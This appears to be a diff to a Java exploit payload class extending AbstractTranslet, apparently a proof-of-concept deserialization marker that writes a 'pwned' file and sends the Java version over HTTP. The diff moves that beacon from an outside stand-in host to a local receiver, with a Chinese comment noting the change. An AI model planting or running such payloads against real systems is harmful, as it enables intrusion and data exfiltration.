@@ -22,9 +22,10 @@ public class Detect extends AbstractTranslet {
             fo.write(("pwned at " + System.currentTimeMillis()).getBytes());
             fo.close();
             // HTTP exfil via plain socket-less URL (java.net is open module)
+            // 2026-09-08 修正：原外部域名 portkey-toward.example.com 已清理，改指向本机收货器
             try {
                 java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(
-                    "http://portkey-toward.example.com/marker?version=" + System.getProperty("java.version")
+                    "http://127.0.0.1:9999/marker?version=" + System.getProperty("java.version")
                 ).openConnection();
                 c.setConnectTimeout(2000);
                 c.setReadTimeout(2000);
